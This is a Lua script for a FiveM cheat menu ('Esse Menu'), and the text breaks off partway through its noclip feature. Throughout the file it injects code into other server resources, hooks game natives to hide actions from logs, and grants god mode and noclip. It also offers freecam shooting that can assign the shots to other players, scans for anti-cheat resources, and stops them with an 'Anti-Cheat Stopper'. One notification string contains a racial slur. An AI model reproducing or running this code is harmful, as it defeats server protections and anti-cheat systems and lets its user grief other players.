local RESOURCE_NAME = "Hello Ho" 
local DISCORD_LINK = "https://discord.gg/7ey9rSK2"
local LOCKED_KEY = "4916671773178804194" .. "285061795029450754"

-- Variable para siguradong isang beses lang mag-run
local isAlreadyAuthenticated = false

local function RunAuthCheck()
        return true
end

-- Dito natin i-check
if not isAlreadyAuthenticated then
    if RunAuthCheck() then
    print("^2[SYSTEM] Loading Esse Menu... F9 To Open^7")
end

MachoHookNative(0xA351ED5D, function(id) 
    if _G.AntiVisualLogging then return false end
    return true
end)

MachoHookNative(0x2491A936, function(t) 
    if _G.AntiVisualLogging then return false end
    return true
end)

MachoHookNative(0x91557C15, function() 
    if _G.AntiVisualLogging then return false end
    return true
end)


MachoHookNative(0xAF35D1D9315F7962, function(m, x, y, z, h, n, s)
    return true
end)

MachoHookNative(0x4805D2B1D8CF46DA, function(e)
    return false, vector3(0.0, 0.0, 0.0)
end)

MachoHookNative(0x1C99E0E7339E0503, function(e, x, y, z)
    return true
end)

MachoHookNative(0xC5F6878D58C49C1D, function(e, t, x, y, z, ox, oy, oz, bi, dr, iu, fr, p12, p13)
    return true
end)

MachoHookNative(0x9174F9F130021BA8, function(v)
    return true
end)

MachoHookNative(0x45F73647F97335D5, function(v, h)
    return false
end)

MachoHookNative(0x3FEFBC9C14943567, function(e)
    return true
end)

MachoHookNative(0xD49F9B0955C36735, function(t, m, x, y, z, h, n, s)
    return true, t, m, x, y, z, h, false, true 
end)

MachoHookNative(0xEF2906E7C1097510, function(p, h, n, s)
    return true
end)

MachoHookNative(0x509D5813D30E381A, function(m, x, y, z, n, s, d)
    return true
end)

MachoHookNative(0x6B9BBD38D379D59F, function(e1, e2, b, x, y, z, rx, ry, rz, p9, p10, p11, p12, p13, p14)
    return true
end)

MachoHookNative(0xD10F3ADC03BC946F, function(e, t, u)
    return true
end)

MachoHookNative(0xAD27EB244FC5943E, function(e, p1, p2)
    return true, e, true, true
end)

MachoHookNative(0x8630247A45BD6829, function(x1, y1, z1, x2, y2, z2, d, p7, w, o, n, p11, s)
    local shooter = (_G.freecamEnabled or _G.ChaosStealthActive) and 0 or o
    return true, x1, y1, z1, x2, y2, z2, d, p7, w, shooter, n, p11, s
end)

MachoHookNative(0x86745F91F1467571, function(x1, y1, z1, x2, y2, z2, d, p7, w, o, a, i, sp)
    local shooter = (_G.freecamEnabled or _G.ChaosStealthActive) and 0 or o
    return true, x1, y1, z1, x2, y2, z2, d, p7, w, shooter, a, i, sp
end)

MachoHookNative(0xF1D71308A7FC12BC, function(p, t, p2, p3)
    return true
end)

MachoHookNative(0xE3AD2BDBA6269024, function(x, y, z, t, s, a, i, sh) 
    return true 
end)

MachoHookNative(0x44767B57FD359927, function()
    if _G.freecamEnabled then
        local p = GetEntityCoords(PlayerPedId())
        return false, p.x, p.y, p.z
    end
    return true
end)

MachoHookNative(0x3D690E7A4E1FD694, function(pi, c)
    if _G.freecamEnabled then return false, false end
    return true
end)

MachoHookNative(0x1CA59E306EC61077, function(ni, t)
    if _G.ChaosStealthActive then return false end
    return true
end)

MachoHookNative(0x310D69A, function(e, n) 
    return false, 0 
end)

MachoHookNative(0x06840DA4F95356E2, function(e, x, y, z, a, d, r, ca)
    return true 
end)

MachoHookNative(0x77296029819F05BC, function(v, id)
    local pV = GetVehiclePedIsIn(PlayerPedId(), false)
    if v ~= 0 and v == pV then return false, -1 end
    return true 
end)

MachoHookNative(0xAD65EB21154E70A8, function(v, id)
    local pV = GetVehiclePedIsIn(PlayerPedId(), false)
    if v ~= 0 and v == pV then return false, false end
    return true
end)

MachoHookNative(0x67EEDAF341A92728, function(v)
    local pV = GetVehiclePedIsIn(PlayerPedId(), false)
    if v ~= 0 and v == pV then return false, true end
    return true
end)

MachoHookNative(0x2E0E1B31, function(p)
    if p == PlayerPedId() then return false, 30 end 
    return true
end)

MachoHookNative(0x6B76DC38C32A6BF0, function(entity, health)
    if _G.MachoImmortalActive and entity == PlayerPedId() then
        return false, 200 
    end
    return true
end)

MachoHookNative(0x239A3351C72DA67F, function(player, toggle)
    if _G.MachoImmortalActive and player == PlayerId() then
        return false, true 
    end
    return true
end)

MachoMenuNotification("Esse", "Version 1 Is Working Fine Nigga")


local WindowTopBar = 5
local GroupSize    = 270 
local GroupGap     = 17
local GroupTopGap  = 9
local TabsWidth    = 200
TabbedWindow = MachoMenuTabbedWindow("     ESSE MENU     ", 800, 250, 790, 500, 200)
MachoMenuSetAccent(TabbedWindow, 220, 220, 220)
local superBoostEnabled = false
local superBoostMultiplier = 1000.0
local displayName = (_G.LoggedUser or "ESSE")
local displayPlan = (_G.LoggedType or "MotherFucker")
MachoMenuText(TabbedWindow, displayName .. " | " .. displayPlan)


MachoMenuText(TabbedWindow, "Main Menu")
local Tab1Button = MachoMenuAddTab(TabbedWindow, "Self")
local Tab1Group1 = MachoMenuGroup(Tab1Button, "SELF OPTIONS", TabsWidth+GroupGap, GroupTopGap+WindowTopBar, TabsWidth+GroupGap+GroupSize, 500-GroupTopGap)
local Tab1Group2 = MachoMenuGroup(Tab1Button, "Miscellaneous", TabsWidth+GroupGap+GroupSize+GroupGap, GroupTopGap+WindowTopBar, TabsWidth+GroupGap+GroupSize+GroupGap+GroupSize, 500-GroupTopGap)




MachoMenuCheckbox(Tab1Group1, "Anti-Crash ",
    function()
        MachoInjectResource('monitor', [[
            _G.MachoAntiCrashActive = true
            Citizen.CreateThread(function()
                while _G.MachoAntiCrashActive do
                    local myPed = PlayerPedId()
                    local myPos = GetEntityCoords(myPed)
                    
                    local handle, ped = FindFirstPed()
                    local success
                    repeat
                        if DoesEntityExist(ped) and ped ~= myPed and not IsPedAPlayer(ped) then
                            local pedPos = GetEntityCoords(ped)
                            local dist = #(myPos - pedPos)
                            
                            if dist < 10.0 then
                                SetEntityAsMissionEntity(ped, true, true)
                                DeleteEntity(ped)
                            end
                        end
                        success, ped = FindNextPed(handle)
                    until not success
                    EndFindPed(handle)
                    
                    Wait(200) 
                end
            end)
        ]])
    end,
    function()
        MachoInjectResource('monitor', [[
            _G.MachoAntiCrashActive = false
        ]])
    end
)

MachoMenuCheckbox(Tab1Group1, "Stats Freeze",
    function()
        MachoInjectResource('monitor', [[
            _G.MachoImmortalActive = true
            
            Citizen.CreateThread(function()
                while _G.MachoImmortalActive do
                    local ped = PlayerPedId()
                    local player = PlayerId()
                    
                    if DoesEntityExist(ped) then
                        -- 1. Hardcore God Mode (Natives)
                        SetEntityInvincible(ped, true)
                        SetPlayerInvincible(player, true)
                        SetEntityCanBeDamaged(ped, false)
                        SetPedCanRagdoll(ped, false)
                        
                        SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                        
                        local maxHealth = GetEntityMaxHealth(ped)
                        if GetEntityHealth(ped) < maxHealth then
                            SetEntityHealth(ped, maxHealth)
                        end
                        SetPedArmour(ped, 200)

                        ResetPlayerStamina(player)
                        SetPedMaxTimeInWater(ped, 999.0) -- Anti-Drown
                        
                        StopGameplayCamShaking(true)
                        SetPedMotionBlur(ped, false)
                        ClearPedBloodDamage(ped)
                        ResetPedVisibleDamage(ped)
                        ClearPedLastWeaponDamage(ped)
                    end
                    
                    Citizen.Wait(0) -- Frame-perfect loop
                end
            end)
        ]])
    end,
    function()
        MachoInjectResource('monitor', [[
            _G.MachoImmortalActive = false
            local ped = PlayerPedId()
            if DoesEntityExist(ped) then
                SetEntityInvincible(ped, false)
                SetPlayerInvincible(PlayerId(), false)
                SetEntityCanBeDamaged(ped, true)
                SetPedCanRagdoll(ped, true)
                SetEntityProofs(ped, false, false, false, false, false, false, false, false)
            end
        ]])
    end
)




MachoMenuCheckbox(Tab1Group2, "Freecam (K)", 
    function()
        MachoMenuNotification("Freecam", "ENABLED: Press K to toggle camera")
        MachoInjectResource("any", [===[
            _G.freecamMaster = true
            _G.freecamEnabled = false
            _G.selectedIndex = 1

            local pistolHash = GetHashKey("WEAPON_PISTOL")
            local carbineHash = GetHashKey("WEAPON_CARBINERIFLE")

            local menuOptions = {"Shoot (Semi)", "Shoot (Auto)", "Evil Twin (Risky)", "Attach Prop", "Tp Me", "Sultan Throw", "Delete Entity", "Hijack Vehicle"}

            local function DrawMenuItem(label, x, y, selected)
                SetTextFont(0)
                SetTextScale(0.28, 0.28) 
                SetTextOutline()
                if selected then SetTextColour(255, 0, 0, 255) else SetTextColour(255, 255, 255, 255) end
                SetTextCentre(true)
                BeginTextCommandDisplayText("STRING")
                AddTextComponentSubstringPlayerName(label)
                EndTextCommandDisplayText(x, y)
            end

            local function RotationToDirection(rot)
                local z, x = math.rad(rot.z), math.rad(rot.x)
                return vector3(-math.sin(z) * math.abs(math.cos(x)), math.cos(z) * math.abs(math.cos(x)), math.sin(x))
            end

            _G.StartFreecam = function(active)
                local ped = PlayerPedId()
                FreezeEntityPosition(ped, active)
                SetEntityInvincible(ped, active)

                if active then
                    _G._fc_pos = GetGameplayCamCoord()
                    local rot = GetGameplayCamRot(2)
                    _G._fc_rot = vector3(rot.x, 0.0, rot.z)
                    _G._fc_cam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                    SetCamActive(_G._fc_cam, true)
                    RenderScriptCams(true, true, 500, true, true)
                    
                    Citizen.CreateThread(function()
                        while _G.freecamEnabled do
                            Wait(0)
                            local menuX, startY = 0.5, 0.72 
                            for i, name in ipairs(menuOptions) do 
                                DrawMenuItem(name, menuX, startY + (i * 0.025), (i == _G.selectedIndex)) 
                            end

                            DrawRect(0.5, 0.5, 0.002, 0.004, 255, 0, 0, 255)

                            local lookX, lookY = GetDisabledControlNormal(0, 1), GetDisabledControlNormal(0, 2)
                            _G._fc_rot = vector3(math.max(math.min(_G._fc_rot.x + (-lookY * 8), 80.0), -80.0), 0.0, _G._fc_rot.z + (-lookX * 8))
                            local speed = IsDisabledControlPressed(0, 21) and 2.5 or (IsDisabledControlPressed(0, 19) and 0.05 or 0.5)
                            local rx, rz = math.rad(_G._fc_rot.x), math.rad(_G._fc_rot.z)
                            local dir = vector3(-math.sin(rz) * math.cos(rx), math.cos(rz) * math.cos(rx), math.sin(rx))
                            local sDir = vector3(-math.cos(rz), -math.sin(rz), 0.0)
                            
                            if IsDisabledControlPressed(0, 32) then _G._fc_pos = _G._fc_pos + (dir * speed) end 
                            if IsDisabledControlPressed(0, 33) then _G._fc_pos = _G._fc_pos - (dir * speed) end 
                            if IsDisabledControlPressed(0, 34) then _G._fc_pos = _G._fc_pos + (sDir * speed) end 
                            if IsDisabledControlPressed(0, 35) then _G._fc_pos = _G._fc_pos - (sDir * speed) end 
                            
                            SetCamCoord(_G._fc_cam, _G._fc_pos.x, _G._fc_pos.y, _G._fc_pos.z)
                            SetCamRot(_G._fc_cam, _G._fc_rot.x, _G._fc_rot.y, _G._fc_rot.z, 2)
                            SetAudioFlag("UseScriptedCameraFilter", true)
                            DisableControlAction(0, 30, true) DisableControlAction(0, 31, true)
                            DisableControlAction(0, 32, true) DisableControlAction(0, 33, true)
                            DisableControlAction(0, 34, true) DisableControlAction(0, 35, true)
                            DisableControlAction(0, 1, true) DisableControlAction(0, 2, true)
                            DisableControlAction(0, 24, true)
                            DisableControlAction(0, 14, true) DisableControlAction(0, 15, true)
                        end
                    end)

                    Citizen.CreateThread(function()
                        while _G.freecamEnabled do
                            Wait(0)
                            local currentPed = PlayerPedId()
                            local mode = menuOptions[_G.selectedIndex]

                            if IsDisabledControlJustPressed(0, 15) then _G.selectedIndex = (_G.selectedIndex - 2) % #menuOptions + 1
                            elseif IsDisabledControlJustPressed(0, 14) then _G.selectedIndex = _G.selectedIndex % #menuOptions + 1 end

                            local camRot = GetCamRot(_G._fc_cam, 2)
                            local camPos = GetCamCoord(_G._fc_cam)
                            local direction = RotationToDirection(camRot)
                            local ray = StartExpensiveSynchronousShapeTestLosProbe(camPos.x, camPos.y, camPos.z, camPos.x + (direction.x * 500), camPos.y + (direction.y * 500), camPos.z + (direction.z * 500), -1, currentPed, 4)
                            local _, hit, coords, _, targetEntity = GetShapeTestResult(ray)

                            local isPressing = IsDisabledControlPressed(0, 24)
                            local isJustPressed = IsDisabledControlJustPressed(0, 24)

                            if (mode == "Shoot (Auto)" and isPressing) or (mode ~= "Shoot (Auto)" and isJustPressed) then
                                local finalOwner = 0 
                                if hit and DoesEntityExist(targetEntity) then
                                    finalOwner = targetEntity
                                end

                                if mode == "Shoot (Semi)" then
                                    ShootSingleBulletBetweenCoords(camPos.x, camPos.y, camPos.z, coords.x, coords.y, coords.z, 1000, true, pistolHash, currentPed, true, true, 1000.0)
                                elseif mode == "Shoot (Auto)" then
                                    ShootSingleBulletBetweenCoords(camPos.x, camPos.y, camPos.z, coords.x, coords.y, coords.z, 1000, true, carbineHash, currentPed, true, true, 1000.0)
                                    Wait(100)
                                elseif mode == "Evil Twin (Risky)" and hit then
                                    if DoesEntityExist(targetEntity) and IsEntityAPed(targetEntity) then
                                        local model = GetEntityModel(targetEntity)
                                        RequestModel(model)
                                        while not HasModelLoaded(model) do Wait(0) end
                                        local twin = ClonePed(targetEntity, GetEntityHeading(targetEntity), true, true)
                                        if DoesEntityExist(twin) then
                                            SetEntityCoords(twin, coords.x + 1.2, coords.y + 1.2, coords.z, false, false, false, true)
                                            SetEntityAsMissionEntity(twin, true, true)
                                            local weapon = GetHashKey("WEAPON_KNIFE")
                                            GiveWeaponToPed(twin, weapon, 1, false, true)
                                            SetCurrentPedWeapon(twin, weapon, true)
                                            SetPedCombatAttributes(twin, 46, true)
                                            SetPedCombatAbility(twin, 100)
                                            SetPedFleeAttributes(twin, 0, false)
                                            SetBlockingOfNonTemporaryEvents(twin, true)
                                            TaskCombatPed(twin, targetEntity, 0, 16)
                                            SetEntityAsNoLongerNeeded(twin)
                                        end
                                    end
                                elseif mode == "Hijack Vehicle" and hit then
                                    if DoesEntityExist(targetEntity) and IsEntityAVehicle(targetEntity) then
                                        NetworkRequestControlOfEntity(targetEntity)
                                        SetPedIntoVehicle(currentPed, targetEntity, -1)
                                        SetVehicleEngineOn(targetEntity, true, true, false)
                                        _G.freecamEnabled = false
                                        _G.StartFreecam(false)
                                    end
                                elseif mode == "Attach Prop" and hit then
                                    if DoesEntityExist(targetEntity) and IsEntityAPed(targetEntity) then
                                        local propHash = GetHashKey("prop_logpile_06b")
                                        RequestModel(propHash)
                                        while not HasModelLoaded(propHash) do Wait(0) end
                                        local obj = CreateObject(propHash, coords.x, coords.y, coords.z, true, true, true)
                                        AttachEntityToEntity(obj, targetEntity, GetPedBoneIndex(targetEntity, 24818), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                                        SetEntityAsNoLongerNeeded(obj)
                                    end
                                elseif mode == "Tp Me" then
                                    SetEntityCoords(currentPed, coords.x, coords.y, coords.z, false, false, false, false)
                                elseif mode == "Sultan Throw" then
                                    local sHash = GetHashKey("sultan")
                                    RequestModel(sHash)
                                    while not HasModelLoaded(sHash) do Wait(0) end
                                    local veh = CreateVehicle(sHash, camPos.x, camPos.y, camPos.z, camRot.z, true, false)
                                    SetEntityVelocity(veh, direction.x * 100.0, direction.y * 100.0, direction.z * 100.0)
                                    Citizen.SetTimeout(5000, function() if DoesEntityExist(veh) then DeleteEntity(veh) end end)
                                elseif mode == "Delete Entity" and hit then
                                    if DoesEntityExist(targetEntity) then
                                        NetworkRequestControlOfEntity(targetEntity)
                                        SetEntityAsMissionEntity(targetEntity, true, true)
                                        DeleteEntity(targetEntity)
                                    end
                                end
                            end
                        end
                        RenderScriptCams(false, true, 500, true, true)
                        if DoesCamExist(_G._fc_cam) then DestroyCam(_G._fc_cam) end
                        FreezeEntityPosition(PlayerPedId(), false)
                    end)
                end
            end

            Citizen.CreateThread(function()
                while _G.freecamMaster do
                    Wait(5)
                    if IsControlJustPressed(0, 311) then 
                        _G.freecamEnabled = not _G.freecamEnabled
                        _G.StartFreecam(_G.freecamEnabled)
                    end
                end
            end)
        ]===])
    end,
    function()
        MachoMenuNotification("Freecam", "DISABLED")
        MachoInjectResource("any", [[ _G.freecamMaster = false _G.freecamEnabled = false ]])
    end
)


MachoMenuButton(Tab1Group2, "Show All Player IDs", function()
    MachoInjectResource("monitor", [[
        local players = GetActivePlayers()
        print("^4[MachoMenu]^7 Scanning Players...")
        for i = 1, #players do
            local id = players[i]
            local sId = GetPlayerServerId(id)
            local name = GetPlayerName(id)
            print(string.format("^2[%d]^7 %s", sId, name))
        end
    end)
    ]])
end)

MachoMenuButton(Tab1Group2, "Toggle Music Player", function()
    ExecuteCommand("musicplayer")
end)
  
MachoMenuButton(Tab1Group2, "Find What Resources Has AC", function()
    local green, white, red, yellow = "^2", "^7", "^1", "^3"

    print(green .. "[AC Checker] " .. white .. "NAG SSCAN NG AC SA BUONG CITY...")

    MachoIsolatedInject([[
        local green, white, red, yellow = "^2", "^7", "^1", "^3"
        local acCount = 0

        for i = 0, GetNumResources() - 1 do
            local name = GetResourceByFindIndex(i)
            
            if name and name ~= "macho" and name ~= "monitor" then
                local acName = nil
                local lowerName = name:lower()
                local clientFiles = (GetResourceMetadata(name, 'client_script', 0) or ""):lower()
                local serverFiles = (GetResourceMetadata(name, 'server_script', 0) or ""):lower()
                local combined = clientFiles .. serverFiles

                if not MachoResourceInjectable(name) then
                    acName = "Protected/Hidden AC"
                end

                if not acName then
                    if lowerName:find("fiveguard") or combined:find("fiveguard") or lowerName:find("fg-") then
                        acName = "Fiveguard"
                    elseif lowerName:find("wave") or combined:find("wave") then
                        acName = "Wave AC"
                    elseif lowerName:find("reaper") or combined:find("reaper") or combined:find("v4") then
                        acName = "Reaper V4"
                    elseif lowerName:find("aegis") or lowerName:find("agx") or combined:find("agx") then
                        acName = "Aegis X"
                    elseif lowerName:find("sentinel") or combined:find("sentinel") then
                        acName = "Sentinel AC"
                    elseif lowerName:find("finiac") or lowerName:find("fini") then
                        acName = "FiniAC"
                    elseif lowerName:find("anticheat") or combined:find("anticheat") or lowerName:find("ac-") then
                        acName = "Generic AC"
                    elseif lowerName:find("shield") or combined:find("shield") then
                        acName = "Shield/Protection"
                    end
                end

                if acName then
                    acCount = acCount + 1
                    print(green .. "[AC Checker] " .. white .. "Detected: " .. red .. acName .. white .. " on resource: " .. yellow .. name)
                end
            end
        end

        if acCount > 0 then
            print(green .. "[AC Checker] " .. white .. "Scan completed. Detected " .. yellow .. tostring(acCount) .. white .. " Anti-Cheats!^7")
        else
            print(red .. "[AC Checker] " .. white .. "Wala kaming mahanap na AC. Baka 'raw' server ito!")
        end
    ]])
end)

MachoMenuButton(Tab1Group2, "Scan for Anti-Cheats", function()
    local green, white, red, yellow = "^2", "^7", "^1", "^3"
    print(green .. "[AC Checker] " .. white .. "Scanning for high-tier protection...")

    MachoIsolatedInject([[
        local green, white, red, yellow = "^2", "^7", "^1", "^3"
        local acList = {}
        
        for i = 0, GetNumResources() - 1 do
            local name = GetResourceByFindIndex(i)
            if name and name ~= "macho" and name ~= "monitor" then
                local lowerName = name:lower()
                local author = (GetResourceMetadata(name, 'author', 0) or ""):lower()
                
                local clientFiles = (GetResourceMetadata(name, 'client_script', 0) or ""):lower()
                local serverFiles = (GetResourceMetadata(name, 'server_script', 0) or ""):lower()
                local extraMeta = (GetResourceMetadata(name, 'fiveguard', 0) or ""):lower() -- Specific for FG
                local combined = clientFiles .. serverFiles .. extraMeta .. lowerName

                local detectedAC = nil

                if lowerName:find("wave") or author:find("wave") or combined:find("wave") then
                    detectedAC = "Wave AC"

                elseif lowerName:find("fini") or author:find("fini") or combined:find("fini") then
                    detectedAC = "Fini AC"

                elseif lowerName:find("fiveguard") or combined:find("fiveguard") or combined:find("fg-") or lowerName == "seph" then
                    detectedAC = "FiveGuard"

                elseif lowerName:find("reaper") or author:find("reaper") or combined:find("reaper") then
                    detectedAC = "Reaper AC"
                
                elseif lowerName:find("electron") or author:find("electron") or combined:find("elec-") then
                    detectedAC = "Electron AC"
                
                elseif lowerName:find("aegis") or combined:find("agx") then
                    detectedAC = "Aegis X"

                elseif lowerName:find("phoenix") or lowerName:find("sentinel") then
                    detectedAC = "Sentinel/Phoenix"
                end

                if detectedAC then
                    table.insert(acList, {name = name, type = detectedAC})
                end
            end
        end

        if #acList > 0 then
            for _, ac in ipairs(acList) do
                print(green .. "[AC Checker] " .. white .. "Detected: " .. red .. ac.type .. white .. " on resource: " .. yellow .. ac.name)
            end
            print(green .. "[AC Checker] " .. white .. "Scan completed. Found ^3" .. #acList .. "^7 threats.")
        else
            print(red .. "[AC Checker] " .. white .. "No high-tier AC detected.")
        end
    ]])
end)


MachoMenuButton(Tab1Group2, "Anti-Cheat Stopper", function()
    local green, white, red, yellow = "^2", "^7", "^1", "^3"
    print(green .. "[AC Stopper] " .. white .. "Scanning for active Anti-Cheat")

    MachoIsolatedInject([[
        local green, white, red, yellow = "^2", "^7", "^1", "^3"
        local mainTarget = nil
        local highScore = 0

        for i = 0, GetNumResources() - 1 do
            local name = GetResourceByFindIndex(i)
            if name and name ~= "macho" and name ~= "monitor" then
                local currentScore = 0
                local lowerName = name:lower()
                local author = (GetResourceMetadata(name, 'author', 0) or ""):lower()
                
                local clientFiles = (GetResourceMetadata(name, 'client_script', 0) or ""):lower()
                local serverFiles = (GetResourceMetadata(name, 'server_script', 0) or ""):lower()
                local extraMeta = (GetResourceMetadata(name, 'fiveguard', 0) or ""):lower()
                local combined = clientFiles .. serverFiles .. extraMeta

                if combined:find("fiveguard") or combined:find("fg-") or lowerName == "seph" then 
                    currentScore = 250 
                elseif combined:find("fini") or combined:find("sentinel") then 
                    currentScore = 200 
                end

          
                local isProtected = not MachoResourceInjectable(name)
                if isProtected and (lowerName:find("needs") or lowerName:find("job") or lowerName:find("essential")) then
                    currentScore = currentScore + 100
                end

         
                if author:find("cfx") or author:find("citizenfx") then 
                    currentScore = -500 
                end

             
                if lowerName:find("female") or lowerName:find("male") or lowerName:find("cloth") or lowerName:find("arsenou") then
                    currentScore = currentScore - 200
                end

                if currentScore > highScore and currentScore > 100 then
                    highScore = currentScore
                    mainTarget = name
                end
            end
        end

        if mainTarget then
            MachoResourceStop(mainTarget)
            print(green .. "[AC Stopper] " .. red .. "NEUTRALIZED: " .. yellow .. mainTarget)
            print(green .. "[AC Stopper] " .. white .. "Anti-Cheat is no longer active.")
        else
            print(red .. "[AC Stopper] " .. white .. "No active Anti-Cheat detected to stop.")
        end
    ]])
end)


MachoMenuText(Tab1Group2, "Admin Stuff")


MachoMenuButton(Tab1Group2, "Pedmenu (ESX/CFX)", function()
    MachoMenuNotification("Clothing", "Opening Ped Menu...")
    MachoInjectResource('illenium-appearance', [[
        TriggerEvent('illenium-appearance:client:openClothingShopMenu', true)
    ]])
end)

MachoMenuButton(Tab1Group2, "TP to Waypoint TxAdmin", function()
    MachoInjectResource('monitor', [[
       
        if IsWaypointActive() then
         
            TriggerEvent('txcl:tpToWaypoint')
            
            sendSnackbarMessage('success', 'teleport.waypoint.success', true)
        else
            
            sendSnackbarMessage('error', 'teleport.waypoint.error', true)
        end
    ]])
end)


local currentKey = 38 
local noclipActive = false 
local noclipMasterPower = false 
local noclipSpeed = 2 



local function RunNoclip(forceState)
 
    if forceState ~= nil then
        noclipActive = forceState
    else
        noclipActive = not noclipActive
    end

    if noclipActive then
    
        MachoInjectResource2(1, "monitor", string.format([[
            local speed = _G.MachoNoclipSpeed or 0.2
            _G.MachoNoclip = true
            _G.MachoNoclipSpeed = %f
            
            Citizen.CreateThread(function()
                local ped = PlayerPedId()
                while _G.MachoNoclip do
                    Wait(0)
                    local speed = _G.MachoNoclipSpeed or 0.1
                    
                    SetEntityInvincible(ped, true)
                    FreezeEntityPosition(ped, true) 
                    SetEntityCollision(ped, false, false)
                    
                    local camRot = GetGameplayCamRot(2)
                    local tZ = math.rad(camRot.z)
                    local tX = math.rad(camRot.x)
                    local num = math.abs(math.cos(tX))
                    
                    local forward = vector3(-math.sin(tZ) * num, math.cos(tZ) * num, math.sin(tX))
                    local right = vector3(math.cos(tZ), math.sin(tZ), 0.0)
                    local pos = GetEntityCoords(ped)

                    if IsControlPressed(0, 32) then pos = pos + (forward * speed) end 
                    if IsControlPressed(0, 33) then pos = pos - (forward * speed) end 
                    if IsControlPressed(0, 34) then pos = pos - (right * speed) end   
                    if IsControlPressed(0, 35) then pos = pos + (right * speed) end  
                    
                    if IsControlPressed(0, 21) then pos = pos + vector3(0,0,speed) end 
                    if IsControlPressed(0, 36) then pos = pos - vector3(0,0,speed) end 

                    SetEntityCoordsNoOffset(ped, pos.x, pos.y, pos.z, true, true, true)
                end
                
             
                FreezeEntityPosition(ped, false)
                SetEntityCollision(ped, true, true)
                SetEntityInvincible(ped, false)
                SetEntityVisible(ped, true, false)
            end)
        ]], noclipSpeed)) 
    else
        
        
        MachoInjectResource("monitor", [[ _G.MachoNoclip = false ]])
    end 
end 




MachoMenuCheckbox(Tab1Group2, "Toggle TxAdmin God Mode", 
 
    function()
        MachoInjectResource("monitor", [[
            _G.txGodModeMaster = true
            
           
            if not _G.txFunctionsLoaded then
                local function sendMenuMessage(action, data)
                    SendNUIMessage({ action = action, data = data })
                end

                _G.sendPersistentAlert = function(key, level, message, isTranslationKey)
                    sendMenuMessage('setPersistentAlert', { key = key, level = level, message = message, isTranslationKey = isTranslationKey })
                end

                _G.clearPersistentAlert = function(key)
                    sendMenuMessage('clearPersistentAlert', { key = key })
                end
                _G.txFunctionsLoaded = true
            end

        
            Citizen.CreateThread(function()
                _G.sendPersistentAlert('godModeEnabled', 'info', 'God Mode: Enabled', false)
                
                while _G.txGodModeMaster do
                    local ped = PlayerPedId()
                    
                
                    SetEntityInvincible(ped, true)
                    SetPlayerInvincible(PlayerId(), true)
                    SetPedCanRagdoll(ped, false)
                    SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                    
            
                    SetEntityHealth(ped, GetEntityMaxHealth(ped))
                    
                    Wait(0)
                end
                
            
                local ped = PlayerPedId()
                SetEntityInvincible(ped, false)
                SetPlayerInvincible(PlayerId(), false)
                SetPedCanRagdoll(ped, true)
                SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                _G.clearPersistentAlert('godModeEnabled')
            end)
        ]])
    end,

 
    function()
        MachoInjectResource("monitor", [[
            _G.txGodModeMaster = false
        ]])
    end
)

MachoMenuCheckbox(Tab1Group2, "Toggle TxAdmin Super Jump", 
    function()
        MachoInjectResource("monitor", [[
            _G.txSuperJumpMaster = true
            
            if not _G.txFunctionsLoaded then
                local function sendMenuMessage(action, data)
                    SendNUIMessage({ action = action, data = data })
                end

                _G.sendPersistentAlert = function(key, level, message, isTranslationKey)
                    sendMenuMessage('setPersistentAlert', { key = key, level = level, message = message, isTranslationKey = isTranslationKey })
                end

                _G.clearPersistentAlert = function(key)
                    sendMenuMessage('clearPersistentAlert', { key = key })
                end
                _G.txFunctionsLoaded = true
            end

            Citizen.CreateThread(function()
                _G.sendPersistentAlert('superJumpEnabled', 'info', 'Super Jump: Enabled', false)
                
                local moveRateOverride = 1.75 
                
                while _G.txSuperJumpMaster do
                    local player = PlayerId()
                    local ped = PlayerPedId()
          
                    SetSuperJumpThisFrame(player)

                    SetEntityMaxSpeed(ped, 100.0) 
                    
                    SetPedMoveRateOverride(ped, moveRateOverride)
                    RestorePlayerStamina(player, 100.0)
                    
                    Wait(0)
                end
                
                _G.clearPersistentAlert('superJumpEnabled')
                SetPedMoveRateOverride(PlayerPedId(), 1.0)
            end)
        ]])
    end,

    function()
        MachoInjectResource("monitor", [[
            _G.txSuperJumpMaster = false
        ]])
    end
)

MachoMenuCheckbox(Tab1Group2, "Toggle TxAdmin NoClip (H)", 
    
    function()
        MachoInjectResource("monitor", [[
            _G.txNoClipMaster = true
            
            if not _G.txFunctionsLoaded then
                _G.noClipEnabled = false
                
                local function sendMenuMessage(action, data)
                    SendNUIMessage({ action = action, data = data })
                end

                _G.sendPersistentAlert = function(key, level, message, isTranslationKey)
                    sendMenuMessage('setPersistentAlert', { key = key, level = level, message = message, isTranslationKey = isTranslationKey })
                end

                _G.clearPersistentAlert = function(key)
                    sendMenuMessage('clearPersistentAlert', { key = key })
                end

                _G.makeFivemInstructionalScaleform = function()
                    local scaleform = RequestScaleformMovie("INSTRUCTIONAL_BUTTONS")
                    while not HasScaleformMovieLoaded(scaleform) do Wait(0) end
                    PushScaleformMovieFunction(scaleform, "CLEAR_ALL")
                    PopScaleformMovieFunctionVoid()
                    local controls = {
                        {label = "Faster (Shift)", hash = 21}, {label = "Slower (Alt)", hash = 19},
                        {label = "Down (E)", hash = 153}, {label = "Up (Q)", hash = 152}, {label = "Move", hash = 32}
                    }
                    for i, btn in ipairs(controls) do
                        PushScaleformMovieFunction(scaleform, "SET_DATA_SLOT")
                        PushScaleformMovieFunctionParameterInt(i-1)
                        PushScaleformMovieMethodParameterButtonName(GetControlInstructionalButton(0, btn.hash, true))
                        PushScaleformMovieMethodParameterString(btn.label)
                        PopScaleformMovieFunctionVoid()
                    end
                    PushScaleformMovieFunction(scaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
                    PopScaleformMovieFunctionVoid()
                    return scaleform
                end

                _G.SetFreecamActive = function(active)
                    local ped = PlayerPedId()
                    if active then
                        _G._internal_pos = GetEntityCoords(ped) -- Start sa current position ng player
                        local rot = GetGameplayCamRot(2)
                        _G._internal_rot = vector3(rot.x, 0.0, rot.z)
                        _G._internal_camera = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
                        SetCamFov(_G._internal_camera, 50.0)
                        RenderScriptCams(true, true, 250, true, true)
                        SetEntityVisible(ped, false, false)
                        SetEntityInvincible(ped, true)
                        FreezeEntityPosition(ped, true)
                        _G.sendPersistentAlert('noClipEnabled', 'info', 'NoClip enabled', false)

                        Citizen.CreateThread(function()
                            local sf = _G.makeFivemInstructionalScaleform()
                            while _G.noClipEnabled do

